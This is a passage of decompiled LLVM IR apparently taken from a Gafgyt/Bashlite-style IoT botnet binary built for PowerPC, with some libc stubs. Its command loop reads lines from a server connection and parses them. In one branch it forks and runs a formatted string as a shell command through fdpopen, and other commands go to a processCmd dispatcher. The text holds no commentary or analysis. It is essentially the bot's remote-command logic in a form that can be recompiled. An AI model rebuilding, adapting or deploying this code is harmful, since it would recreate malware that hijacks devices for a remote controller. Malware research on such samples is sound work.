dec_label_pc_10007064:                            ; preds = %dec_label_pc_10007018
  %v4_1000705c = icmp eq i32 %v2_10007044, %v4_1000701c
  br i1 %v4_1000705c, label %dec_label_pc_10007074, label %dec_label_pc_10007084

dec_label_pc_10007074:                            ; preds = %dec_label_pc_10007064
  %v3_1000707c = icmp ugt i32 %v3_10007048, %storemerge12
  br i1 %v3_1000707c, label %dec_label_pc_10006dc0, label %dec_label_pc_10007084

dec_label_pc_10007084:                            ; preds = %dec_label_pc_10007064, %dec_label_pc_10007074
  %v2_1000708c = add i32 %v5_1000758c, %v2_10007088
  %v3_10007094 = add i32 %v2_1000708c, 1624
  %v4_10007094 = inttoptr i32 %v3_10007094 to i8*
  store i8 0, i8* %v4_10007094, align 1
  %v1_100070a0 = call i32 @trim(i32 %v2_1000757c)
  store i32 268464312, i32* @lr, align 4
  %v6_100070b4 = call i32 @strstr(i32 %v2_1000757c, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1001139c.206, i32 0, i32 0), i32 ptrtoint ([31 x i8]* @global_var_10010000.5 to i32))
  %v4_100070c0 = icmp eq i32 %v6_100070b4, %v2_1000757c
  br i1 %v4_100070c0, label %dec_label_pc_10007574, label %dec_label_pc_100070c8

dec_label_pc_100070c8:                            ; preds = %dec_label_pc_10007084
  store i32 268464348, i32* @lr, align 4
  %v6_100070d8 = call i32 @strstr(i32 %v2_1000757c, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_100114d8.261, i32 0, i32 0), i32 ptrtoint ([31 x i8]* @global_var_10010000.5 to i32))
  %v4_100070e4 = icmp eq i32 %v6_100070d8, %v2_1000757c
  br i1 %v4_100070e4, label %dec_label_pc_100070ec, label %dec_label_pc_10007120

dec_label_pc_100070ec:                            ; preds = %dec_label_pc_100070c8
  %v1_100070f0 = add i32 %stack_var_-5748.2.ph, 1
  %v4_10007108 = call i32 @zprintf(i32 ptrtoint ([20 x i8]* @global_var_100114e4.262 to i32), i32 ptrtoint ([31 x i8]* @global_var_10010000.5 to i32))
  %tmp111 = icmp slt i32 %v1_100070f0, 21
  br i1 %tmp111, label %dec_label_pc_10006d3c.outer, label %dec_label_pc_10007118

dec_label_pc_10007118:                            ; preds = %dec_label_pc_100070ec
  %v0_1000711c = call i32 @__GI_exit()
  br label %dec_label_pc_10007120

dec_label_pc_10007120:                            ; preds = %dec_label_pc_100070c8, %dec_label_pc_10007118
  %stack_var_-5748.1 = phi i32 [ %v1_100070f0, %dec_label_pc_10007118 ], [ %stack_var_-5748.2.ph, %dec_label_pc_100070c8 ]
  %v2_1000712c = load i8, i8* %v4_1000758c, align 4
  %v3_10007134 = icmp eq i8 %v2_1000712c, 33
  br i1 %v3_10007134, label %dec_label_pc_10007158, label %dec_label_pc_10007574.outer

dec_label_pc_10007158:                            ; preds = %dec_label_pc_10007120, %dec_label_pc_1000716c
  %storemerge = phi i32 [ %v1_10007140, %dec_label_pc_1000716c ], [ %v2_1000757c, %dec_label_pc_10007120 ]
  %v1_10007140 = add i32 %storemerge, 1
  %storemerge8 = inttoptr i32 %v1_10007140 to i8*
  %v2_1000715c = load i8, i8* %storemerge8, align 1
  %v3_10007164 = icmp eq i8 %v2_1000715c, 32
  br i1 %v3_10007164, label %dec_label_pc_10007180, label %dec_label_pc_1000716c

dec_label_pc_1000716c:                            ; preds = %dec_label_pc_10007158
  %v2_10007170 = load i8, i8* %storemerge8, align 1
  %v3_10007178 = icmp eq i8 %v2_10007170, 0
  br i1 %v3_10007178, label %dec_label_pc_10007180, label %dec_label_pc_10007158

dec_label_pc_10007180:                            ; preds = %dec_label_pc_1000716c, %dec_label_pc_10007158
  %v2_10007184 = load i8, i8* %storemerge8, align 1
  %v3_1000718c = icmp eq i8 %v2_10007184, 0
  br i1 %v3_1000718c, label %dec_label_pc_10007574.outer, label %dec_label_pc_10007194

dec_label_pc_10007194:                            ; preds = %dec_label_pc_10007180
  store i8 0, i8* %storemerge8, align 1
  store i32 %v1_100071a4, i32* @r3, align 4
  %v0_100071b4 = call i32 @__GI_strlen()
  %v2_100071c4 = add i32 %v0_100071b4, %v2_1000757c
  %v1_100071c8 = add i32 %v2_100071c4, 2
  %v2_10007214 = add i32 %v2_100071c4, 1
  br label %dec_label_pc_100071fc

dec_label_pc_100071d4:                            ; preds = %dec_label_pc_1000722c, %dec_label_pc_100071fc
  store i32 %v1_100071c8, i32* @r3, align 4
  %v0_100071dc = call i32 @__GI_strlen()
  %v1_100071f0 = add i32 %v0_100071dc, %v2_10007214
  %v3_100071f8 = inttoptr i32 %v1_100071f0 to i8*
  store i8 0, i8* %v3_100071f8, align 1
  br label %dec_label_pc_100071fc

dec_label_pc_100071fc:                            ; preds = %dec_label_pc_10007194, %dec_label_pc_100071d4
  store i32 %v1_100071c8, i32* @r3, align 4
  %v0_10007204 = call i32 @__GI_strlen()
  %v1_10007218 = add i32 %v0_10007204, %v2_10007214
  %v1_1000721c = inttoptr i32 %v1_10007218 to i8*
  %v2_1000721c = load i8, i8* %v1_1000721c, align 1
  %v3_10007224 = icmp eq i8 %v2_1000721c, 10
  br i1 %v3_10007224, label %dec_label_pc_100071d4, label %dec_label_pc_1000722c

dec_label_pc_1000722c:                            ; preds = %dec_label_pc_100071fc
  store i32 %v1_100071c8, i32* @r3, align 4
  %v0_10007234 = call i32 @__GI_strlen()
  %v1_10007248 = add i32 %v0_10007234, %v2_10007214
  %v1_1000724c = inttoptr i32 %v1_10007248 to i8*
  %v2_1000724c = load i8, i8* %v1_1000724c, align 1
  %v3_10007254 = icmp eq i8 %v2_1000724c, 13
  br i1 %v3_10007254, label %dec_label_pc_100071d4, label %dec_label_pc_10007274.preheader

dec_label_pc_10007274.preheader:                  ; preds = %dec_label_pc_1000722c
  %stack_var_-5780.029 = inttoptr i32 %v1_100071c8 to i8*
  %v2_1000727830 = load i8, i8* %stack_var_-5780.029, align 1
  %v3_1000728034 = icmp eq i8 %v2_1000727830, 32
  br i1 %v3_1000728034, label %dec_label_pc_1000729c, label %dec_label_pc_10007288

dec_label_pc_10007268:                            ; preds = %dec_label_pc_10007288
  %v1_1000726c = add i32 %storemerge1935, 1
  %stack_var_-5780.0 = inttoptr i32 %v1_1000726c to i8*
  %v2_10007278 = load i8, i8* %stack_var_-5780.0, align 1
  %v3_10007280 = icmp eq i8 %v2_10007278, 32
  br i1 %v3_10007280, label %dec_label_pc_1000729c, label %dec_label_pc_10007288

dec_label_pc_10007288:                            ; preds = %dec_label_pc_10007274.preheader, %dec_label_pc_10007268
  %stack_var_-5780.036 = phi i8* [ %stack_var_-5780.0, %dec_label_pc_10007268 ], [ %stack_var_-5780.029, %dec_label_pc_10007274.preheader ]
  %storemerge1935 = phi i32 [ %v1_1000726c, %dec_label_pc_10007268 ], [ %v1_100071c8, %dec_label_pc_10007274.preheader ]
  %v2_1000728c = load i8, i8* %stack_var_-5780.036, align 1
  %v3_10007294 = icmp eq i8 %v2_1000728c, 0
  br i1 %v3_10007294, label %dec_label_pc_1000729c, label %dec_label_pc_10007268

dec_label_pc_1000729c:                            ; preds = %dec_label_pc_10007268, %dec_label_pc_10007288, %dec_label_pc_10007274.preheader
  %storemerge19.lcssa = phi i32 [ %v1_100071c8, %dec_label_pc_10007274.preheader ], [ %v1_1000726c, %dec_label_pc_10007268 ], [ %storemerge1935, %dec_label_pc_10007288 ]
  %stack_var_-5780.0.lcssa = phi i8* [ %stack_var_-5780.029, %dec_label_pc_10007274.preheader ], [ %stack_var_-5780.0, %dec_label_pc_10007268 ], [ %stack_var_-5780.036, %dec_label_pc_10007288 ]
  store i8 0, i8* %stack_var_-5780.0.lcssa, align 1
  %v1_100072ac = add i32 %storemerge19.lcssa, 1
  %v2_100072f841 = load i8, i8* %stack_var_-5780.029, align 1
  %v3_1000730044 = icmp eq i8 %v2_100072f841, 0
  br i1 %v3_1000730044, label %dec_label_pc_10007308, label %dec_label_pc_100072c0

dec_label_pc_100072c0:                            ; preds = %dec_label_pc_1000729c, %dec_label_pc_100072c0
  %storemerge746 = phi i8* [ %storemerge7, %dec_label_pc_100072c0 ], [ %stack_var_-5780.029, %dec_label_pc_1000729c ]
  %storemerge1445 = phi i32 [ %v1_100072ec, %dec_label_pc_100072c0 ], [ %v1_100071c8, %dec_label_pc_1000729c ]
  %v3_100072c4 = load i8, i8* %storemerge746, align 1
  %v4_100072c4 = zext i8 %v3_100072c4 to i32
  store i32 268464856, i32* @lr, align 4
  %v3_100072d4 = call i32 @__GI_toupper(i32 %v4_100072c4, i32 %storemerge1445)
  %v1_100072e4 = trunc i32 %v3_100072d4 to i8
  store i8 %v1_100072e4, i8* %storemerge746, align 1
  %v1_100072ec = add i32 %storemerge1445, 1
  %storemerge7 = inttoptr i32 %v1_100072ec to i8*
  %v2_100072f8 = load i8, i8* %storemerge7, align 1
  %v3_10007300 = icmp eq i8 %v2_100072f8, 0
  br i1 %v3_10007300, label %dec_label_pc_10007308, label %dec_label_pc_100072c0

dec_label_pc_10007308:                            ; preds = %dec_label_pc_100072c0, %dec_label_pc_1000729c
  store i32 ptrtoint ([11 x i8]* @global_var_100114f8.263 to i32), i32* @r4, align 4
  %v4_10007318 = call i32 @__GI_strcoll(i8* %stack_var_-5780.029, i32 ptrtoint ([11 x i8]* @global_var_100114f8.263 to i32))
  %v3_10007320 = icmp eq i32 %v4_10007318, 0
  br i1 %v3_10007320, label %dec_label_pc_10007328, label %dec_label_pc_100073f0

dec_label_pc_10007328:                            ; preds = %dec_label_pc_10007308
  store i32 268464940, i32* @lr, align 4
  %v0_10007328 = call i32 @listFork()
  %v3_10007330 = icmp eq i32 %v0_10007328, 0
  br i1 %v3_10007330, label %dec_label_pc_10007338, label %dec_label_pc_10007574.outer

dec_label_pc_10007338:                            ; preds = %dec_label_pc_10007328
  store i32 268464976, i32* @lr, align 4
  %v3_1000734c = call i32 @__GI_memset(i32 %v2_10007338, i32 0, i32 1024)
  %v4_1000736c = call i32 @szprintf(i32 %v2_10007338, i32 ptrtoint ([8 x i8]* @global_var_10011504.264 to i32), i32 %v1_100072ac)
  store i32 268465032, i32* @lr, align 4
  %v3_10007384 = call i32 @fdpopen(i32 %v2_10007338, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_1001143c.244, i32 0, i32 0))
  br label %dec_label_pc_100073c0

dec_label_pc_10007394:                            ; preds = %dec_label_pc_100073c0
  %v1_1000739c = call i32 @trim(i32 %v2_10007338)
  store i32 ptrtoint ([3 x i8]* @global_var_100073b8.265 to i32), i32* @lr, align 4
  %v3_100073b4 = call i32 @__GI_memset(i32 %v2_10007338, i32 0, i32 1024)
  store i32 268465088, i32* @lr, align 4
  %v1_100073bc = call i32 @sleep(i32 1)
  br label %dec_label_pc_100073c0

dec_label_pc_100073c0:                            ; preds = %dec_label_pc_10007338, %dec_label_pc_10007394
  %v3_100073d0 = call i32 @fdgets(i32 %v2_10007338, i32 1024, i32 %v3_10007384)
  %v3_100073d8 = icmp eq i32 %v3_100073d0, 0
  br i1 %v3_100073d8, label %dec_label_pc_100073e0, label %dec_label_pc_10007394

dec_label_pc_100073e0:                            ; preds = %dec_label_pc_100073c0
  %v1_100073e4 = call i32 @fdpclose(i32 %v3_10007384)
  %v0_100073ec = call i32 @__GI_exit()
  br label %dec_label_pc_100073f0

dec_label_pc_100073f0:                            ; preds = %dec_label_pc_10007308, %dec_label_pc_100073e0
  store i32 ptrtoint (i32* @global_var_1001150c.268 to i32), i32* @r4, align 4
  store i32 268465164, i32* @lr, align 4
  %v4_10007408 = call i32 @__GI_strtok(i32 %v1_100072ac, i32 ptrtoint (i32* @global_var_1001150c.268 to i32), i32 ptrtoint ([31 x i8]* @global_var_10010000.5 to i32))
  store i32 %v1_100071c8, i32* %stack_var_-5472, align 4
  %v3_1000750050 = icmp eq i32 %v4_10007408, 0
  br i1 %v3_1000750050, label %dec_label_pc_10007508, label %dec_label_pc_10007420

dec_label_pc_10007420:                            ; preds = %dec_label_pc_100073f0, %dec_label_pc_100074e4
  %stack_var_-5808.053.in = phi i32 [ %v4_100074f0, %dec_label_pc_100074e4 ], [ %v4_10007408, %dec_label_pc_100073f0 ]
  %stack_var_-5804.151 = phi i32 [ %stack_var_-5804.0, %dec_label_pc_100074e4 ], [ 1, %dec_label_pc_100073f0 ]
  %stack_var_-5808.053 = inttoptr i32 %stack_var_-5808.053.in to i8*
  %v2_10007424 = load i8, i8* %stack_var_-5808.053, align 1
  %v3_1000742c = icmp eq i8 %v2_10007424, 10
  br i1 %v3_1000742c, label %dec_label_pc_100074e4, label %dec_label_pc_10007434

dec_label_pc_10007434:                            ; preds = %dec_label_pc_10007420
  store i32 %stack_var_-5804.151, i32* @r29, align 4
  store i32 %stack_var_-5808.053.in, i32* @r3, align 4
  %v0_10007440 = call i32 @__GI_strlen()
  %v1_10007448 = add i32 %v0_10007440, 1
  store i32 %v1_10007448, i32* @r3, align 4
  store i32 268465236, i32* @lr, align 4
  %v0_10007450 = call i32 @malloc()
  %v0_1000745c = load i32, i32* @r29, align 4
  %v1_1000745c = mul i32 %v0_1000745c, 4
  %v1_10007468 = add i32 %v1_1000745c, %v2_10007544
  %v2_1000746c = inttoptr i32 %v1_10007468 to i32*
  store i32 %v0_10007450, i32* %v2_1000746c, align 4
  %v1_10007474 = mul i32 %stack_var_-5804.151, 4
  %v1_10007480 = add i32 %v1_10007474, %v2_10007544
  %v1_10007484 = inttoptr i32 %v1_10007480 to i32*
  %v2_10007484 = load i32, i32* %v1_10007484, align 4
  store i32 %stack_var_-5808.053.in, i32* @r3, align 4
  %v0_10007490 = call i32 @__GI_strlen()
  %v1_10007498 = add i32 %v0_10007490, 1
  store i32 268465328, i32* @lr, align 4
  %v3_100074ac = call i32 @__GI_memset(i32 %v2_10007484, i32 0, i32 %v1_10007498)
  %v2_100074c4 = load i32, i32* %v1_10007484, align 4
  %v4_100074d4 = call i32 @strcpy(i32 %v2_100074c4, i8* nonnull %stack_var_-5808.053)
  %v1_100074dc = add i32 %stack_var_-5804.151, 1
  br label %dec_label_pc_100074e4

dec_label_pc_100074e4:                            ; preds = %dec_label_pc_10007420, %dec_label_pc_10007434
  %stack_var_-5804.0 = phi i32 [ %stack_var_-5804.151, %dec_label_pc_10007420 ], [ %v1_100074dc, %dec_label_pc_10007434 ]
  store i32 ptrtoint (i32* @global_var_1001150c.268 to i32), i32* @r4, align 4
  store i32 268465396, i32* @lr, align 4
  %v4_100074f0 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1001150c.268 to i32), i32 ptrtoint ([31 x i8]* @global_var_10010000.5 to i32))
  %v3_10007500 = icmp eq i32 %v4_100074f0, 0
  br i1 %v3_10007500, label %dec_label_pc_10007508, label %dec_label_pc_10007420

dec_label_pc_10007508:                            ; preds = %dec_label_pc_100074e4, %dec_label_pc_100073f0
  %stack_var_-5804.1.lcssa = phi i32 [ 1, %dec_label_pc_100073f0 ], [ %stack_var_-5804.0, %dec_label_pc_100074e4 ]
  store i32 268465432, i32* @lr, align 4
  %v3_10007514 = call i32 @processCmd(i32 %stack_var_-5804.1.lcssa, i32* nonnull %stack_var_-5472)
  %tmp112 = icmp slt i32 %stack_var_-5804.1.lcssa, 2
  br i1 %tmp112, label %dec_label_pc_10007574.outer, label %dec_label_pc_10007538.lr.ph

dec_label_pc_10007538.lr.ph:                      ; preds = %dec_label_pc_10007508
  store i32 1, i32* %stack_var_-5816, align 4
  br label %dec_label_pc_10007538

dec_label_pc_10007538:                            ; preds = %dec_label_pc_10007538.lr.ph, %dec_label_pc_10007538
  %v3_10007538 = phi i32 [ 1, %dec_label_pc_10007538.lr.ph ], [ %v1_1000755c, %dec_label_pc_10007538 ]
  %v1_1000753c = mul i32 %v3_10007538, 4
  %v1_10007548 = add i32 %v2_10007544, %v1_1000753c
  %v1_1000754c = inttoptr i32 %v1_10007548 to i32*
  %v2_1000754c = load i32, i32* %v1_1000754c, align 4
  store i32 %v2_1000754c, i32* @r3, align 4
  store i32 268465496, i32* @lr, align 4
  %v0_10007554 = call i32 @free()
  %v3_10007558 = load i32, i32* %stack_var_-5816, align 4
  %v1_1000755c = add i32 %v3_10007558, 1
  store i32 %v1_1000755c, i32* %stack_var_-5816, align 4
  %v2_1000756c = icmp slt i32 %v1_1000755c, %stack_var_-5804.1.lcssa
  br i1 %v2_1000756c, label %dec_label_pc_10007538, label %dec_label_pc_10007574.outer

dec_label_pc_10007574.outer:                      ; preds = %dec_label_pc_10007538, %dec_label_pc_10007120, %dec_label_pc_10007328, %dec_label_pc_10007508, %dec_label_pc_10007180, %dec_label_pc_10006d58
  %stack_var_-5748.2.ph = phi i32 [ %stack_var_-5748.0.ph21, %dec_label_pc_10006d58 ], [ %stack_var_-5748.1, %dec_label_pc_10007180 ], [ %stack_var_-5748.1, %dec_label_pc_10007508 ], [ %stack_var_-5748.1, %dec_label_pc_10007328 ], [ %stack_var_-5748.1, %dec_label_pc_10007120 ], [ %stack_var_-5748.1, %dec_label_pc_10007538 ]
  br label %dec_label_pc_10007574

dec_label_pc_10007574:                            ; preds = %dec_label_pc_10007574.outer, %dec_label_pc_10007084
  %v3_10007578 = load i32, i32* @global_var_10023510.27, align 4
  %v5_1000758c = call i32 @recvLine(i32 %v3_10007578, i8* %v4_1000758c, i32 4096, i32 %v2_1000757c)
  %v4_100075a0 = icmp eq i32 %v5_1000758c, -1
  br i1 %v4_100075a0, label %dec_label_pc_10006d3c.outer, label %dec_label_pc_10007018

; uselistorder directives
  uselistorder i32 %v5_1000758c, { 1, 0 }
  uselistorder i32 %v1_1000755c, { 1, 2, 0 }
  uselistorder i32 %stack_var_-5804.1.lcssa, { 2, 1, 0 }
  uselistorder i32 %v4_100074f0, { 1, 0 }
  uselistorder i8* %stack_var_-5808.053, { 1, 0 }
  uselistorder i32 %stack_var_-5804.151, { 1, 3, 0, 2 }
  uselistorder i8* %storemerge7, { 1, 0 }
  uselistorder i32 %v1_100072ec, { 1, 0 }
  uselistorder i32 %storemerge1445, { 1, 0 }
  uselistorder i8* %storemerge746, { 1, 0 }
  uselistorder i32 %v1_100072ac, { 1, 0 }
  uselistorder i8* %stack_var_-5780.029, { 3, 0, 4, 2, 1, 5 }
  uselistorder i32 %v1_100071c8, { 5, 0, 2, 1, 3, 6, 7, 4 }
  uselistorder i32 %v1_10007140, { 1, 0 }
  uselistorder i32 %v1_100070f0, { 1, 2, 0 }
  uselistorder i32 %v2_10007044, { 1, 0 }
  uselistorder i32 %storemerge12, { 3, 5, 0, 1, 2, 4 }
  uselistorder i32 %storemerge17, { 1, 0, 2 }
  uselistorder i32 %v1_10006f4c, { 1, 0 }
  uselistorder i32 %v0_10006f30, { 1, 0 }
  uselistorder i32 %v3_10006ee4, { 1, 0 }
  uselistorder i32 %v1_10006dfc, { 1, 3, 0, 2 }
  uselistorder i32 %v2_10007544, { 2, 1, 0 }
  uselistorder i32 %v2_10007338, { 3, 1, 2, 4, 0, 5 }
  uselistorder i8* %v4_1000758c, { 1, 0 }
  uselistorder i32 %v2_1000757c, { 5, 1, 0, 3, 4, 6, 7, 8, 2 }
  uselistorder i32 %v3_10006c38, { 1, 0, 2 }
  uselistorder i32 %v2_10006bc4, { 1, 0, 2 }
  uselistorder i32 %v2_10006b9c, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v1_10006b64, { 0, 2, 1 }
  uselistorder i32 %stack_var_-5756.0, { 4, 1, 0, 3, 2, 5 }
  uselistorder i32* %v1_10006a04, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %stack_var_-5816, { 1, 2, 0, 3 }
  uselistorder i32 (i32, i32, i32)* @__GI_strtok, { 9, 8, 7, 6, 5, 4, 1, 0, 3, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_1001150c.268 to i32), { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32)* @fdgets, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @szprintf, { 1, 0 }
  uselistorder i32 ()* @listFork, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_toupper, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @trim, { 1, 0 }
  uselistorder i32* @global_var_10023518.42, { 2, 3, 0, 4, 5, 6, 7, 1, 8 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @Rootsprintf, { 1, 0 }
  uselistorder i32 (i32)* @sleep, { 1, 0 }
  uselistorder i32 ()* @initConnection, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @zprintf, { 2, 1, 0 }
  uselistorder i32 ()* @__libc_fork, { 4, 3, 1, 2, 0 }
  uselistorder i8 47, { 1, 0 }
  uselistorder [2 x i8]* @global_var_1001143c.244, { 1, 0 }
  uselistorder i32 ptrtoint ([2 x i8]* @global_var_1001143c.244 to i32), { 1, 0 }
  uselistorder i32 (i32)* @init_rand, { 1, 0 }
  uselistorder i32 (i32)* @srand, { 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_time, { 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 0, 5, 4, 3, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_10011424.239 to i32), { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_10007574.outer, { 0, 3, 2, 4, 1, 5 }
  uselistorder label %dec_label_pc_10007538, { 1, 0 }
  uselistorder label %dec_label_pc_100074e4, { 1, 0 }
  uselistorder label %dec_label_pc_10007420, { 1, 0 }
  uselistorder label %dec_label_pc_100073f0, { 1, 0 }
  uselistorder label %dec_label_pc_100073c0, { 1, 0 }
  uselistorder label %dec_label_pc_100072c0, { 1, 0 }
  uselistorder label %dec_label_pc_1000729c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10007288, { 1, 0 }
  uselistorder label %dec_label_pc_100071fc, { 1, 0 }
  uselistorder label %dec_label_pc_10007158, { 1, 0 }
  uselistorder label %dec_label_pc_10007120, { 1, 0 }
  uselistorder label %dec_label_pc_10007084, { 1, 0 }
  uselistorder label %dec_label_pc_1000700c, { 1, 0 }
  uselistorder label %dec_label_pc_10006f88, { 1, 0 }
  uselistorder label %dec_label_pc_10006f48, { 1, 0 }
  uselistorder label %dec_label_pc_10006e50, { 1, 0 }
  uselistorder label %dec_label_pc_10006e08, { 1, 0 }
  uselistorder label %dec_label_pc_10006d4c, { 1, 0 }
  uselistorder label %dec_label_pc_10006d3c.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10006d1c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10006c80, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_10006b60, { 1, 0 }
  uselistorder label %dec_label_pc_10006b00, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* @r3, align 4
  %stack_var_-32 = alloca i32, align 4
  %v4_100075bc = icmp eq i32 %arg2, -2143521772
  %v2_100075d0 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_100075d0, i32* %stack_var_-32, align 4
  br i1 %v4_100075bc, label %dec_label_pc_10007630, label %dec_label_pc_100075f0

dec_label_pc_100075f0:                            ; preds = %entry
  %v3_100075f0 = icmp ugt i32 %arg2, -2143521772
  br i1 %v3_100075f0, label %dec_label_pc_10007608, label %dec_label_pc_100075f8

dec_label_pc_100075f8:                            ; preds = %dec_label_pc_100075f0
  %v3_100075fc = icmp eq i32 %arg2, 1077703699
  br i1 %v3_100075fc, label %dec_label_pc_10007624, label %dec_label_pc_10007650

dec_label_pc_10007608:                            ; preds = %dec_label_pc_100075f0
  %v1_10007608 = xor i32 %arg2, -2143551488
  %v3_1000760c = icmp eq i32 %v1_10007608, 29717
  br i1 %v3_1000760c, label %dec_label_pc_10007640, label %dec_label_pc_10007614

dec_label_pc_10007614:                            ; preds = %dec_label_pc_10007608
  %v3_10007618 = icmp eq i32 %v1_10007608, 29718
  br i1 %v3_10007618, label %dec_label_pc_10007648, label %dec_label_pc_10007650

dec_label_pc_10007624:                            ; preds = %dec_label_pc_100075f8
  store i32 ptrtoint (i32* @global_var_1000762c.269 to i32), i32* @lr, align 4
  %v1_10007628 = inttoptr i32 %arg3 to i32*
  %v2_10007628 = call i32 @__GI_tcgetattr(i32* %v1_10007628)
  br label %dec_label_pc_10007638

dec_label_pc_10007630:                            ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_10007634

dec_label_pc_10007634:                            ; preds = %dec_label_pc_10007648, %dec_label_pc_10007640, %dec_label_pc_10007630
  store i32 268465720, i32* @lr, align 4
  %v0_10007634 = call i32 @__GI_tcsetattr()
  br label %dec_label_pc_10007638

dec_label_pc_10007638:                            ; preds = %dec_label_pc_10007624, %dec_label_pc_10007634
  %storemerge = phi i32 [ %v0_10007634, %dec_label_pc_10007634 ], [ %v2_10007628, %dec_label_pc_10007624 ]
  store i32 %storemerge, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000767c

dec_label_pc_10007640:                            ; preds = %dec_label_pc_10007608
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_10007634

dec_label_pc_10007648:                            ; preds = %dec_label_pc_10007614
  store i32 2, i32* @r4, align 4
  br label %dec_label_pc_10007634

dec_label_pc_10007650:                            ; preds = %dec_label_pc_10007614, %dec_label_pc_100075f8
  %v0_10007660 = call i32 @__asm_mfcr()
  %v1_10007664 = and i32 %v0_10007660, 268435456
  %v3_10007664 = icmp eq i32 %v1_10007664, 0
  store i32 %v0_10007660, i32* %r31.global-to-local, align 4
  br i1 %v3_10007664, label %dec_label_pc_1000767c, label %dec_label_pc_10007670

dec_label_pc_10007670:                            ; preds = %dec_label_pc_10007650
  %v0_10007670 = call i32 @__errno_location()
  %v0_10007674 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007674 = inttoptr i32 %v0_10007670 to i32*
  store i32 %v0_10007674, i32* %v2_10007674, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000767c

dec_label_pc_1000767c:                            ; preds = %dec_label_pc_10007650, %dec_label_pc_10007638, %dec_label_pc_10007670
  %v0_10007680 = phi i32 [ %v0_10007660, %dec_label_pc_10007650 ], [ %storemerge, %dec_label_pc_10007638 ], [ -1, %dec_label_pc_10007670 ]
  ret i32 %v0_10007680

; uselistorder directives
  uselistorder i32 %arg2, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000767c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10007638, { 1, 0 }
}

define i32 @__vfork() local_unnamed_addr {
entry:
  %v0_1000769c = load i32, i32* @lr, align 4
  %v1_1000769c = load i1, i1* @cr0_so, align 1
  %v2_1000769c = xor i1 %v1_1000769c, true
  call void @__pseudo_cond_branch(i1 %v2_1000769c, i32 %v0_1000769c)
  %v0_100076a0 = call i32 @__syscall_error()
  ret i32 %v0_100076a0
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v1_100076b8 = add i32 %arg2, -12
  %v2_100076bc = icmp ugt i32 %v1_100076b8, 2
  %v2_100076c4 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_100076c4, i32* %stack_var_-32, align 4
  br i1 %v2_100076bc, label %dec_label_pc_100076f0, label %dec_label_pc_100076e0

dec_label_pc_100076e0:                            ; preds = %entry
  store i32 268465896, i32* @lr, align 4
  %v2_100076e4 = call i32 @__GI_fcntl64(i32 3)
  store i32 %v2_100076e4, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10007710

dec_label_pc_100076f0:                            ; preds = %entry
  %v0_100076f4 = call i32 @__asm_mfcr()
  %v1_100076f8 = and i32 %v0_100076f4, 268435456
  %v3_100076f8 = icmp eq i32 %v1_100076f8, 0
  store i32 %v0_100076f4, i32* %r31.global-to-local, align 4
  br i1 %v3_100076f8, label %dec_label_pc_10007710, label %dec_label_pc_10007704

dec_label_pc_10007704:                            ; preds = %dec_label_pc_100076f0
  %v0_10007704 = call i32 @__errno_location()
  %v0_10007708 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007708 = inttoptr i32 %v0_10007704 to i32*
  store i32 %v0_10007708, i32* %v2_10007708, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10007710

dec_label_pc_10007710:                            ; preds = %dec_label_pc_100076f0, %dec_label_pc_100076e0, %dec_label_pc_10007704
  %v0_10007714 = phi i32 [ %v0_100076f4, %dec_label_pc_100076f0 ], [ %v2_100076e4, %dec_label_pc_100076e0 ], [ -1, %dec_label_pc_10007704 ]
  ret i32 %v0_10007714

; uselistorder directives
  uselistorder label %dec_label_pc_10007710, { 2, 0, 1 }
}

define i32 @__GI_fcntl64(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v2_10007740 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_10007740, i32* %stack_var_-32, align 4
  %v0_1000775c = call i32 @__asm_mfcr()
  %v1_10007760 = and i32 %v0_1000775c, 268435456
  %v3_10007760 = icmp eq i32 %v1_10007760, 0
  store i32 %v0_1000775c, i32* %r31.global-to-local, align 4
  br i1 %v3_10007760, label %dec_label_pc_10007778, label %dec_label_pc_1000776c

dec_label_pc_1000776c:                            ; preds = %entry
  %v0_1000776c = call i32 @__errno_location()
  %v0_10007770 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007770 = inttoptr i32 %v0_1000776c to i32*
  store i32 %v0_10007770, i32* %v2_10007770, align 4
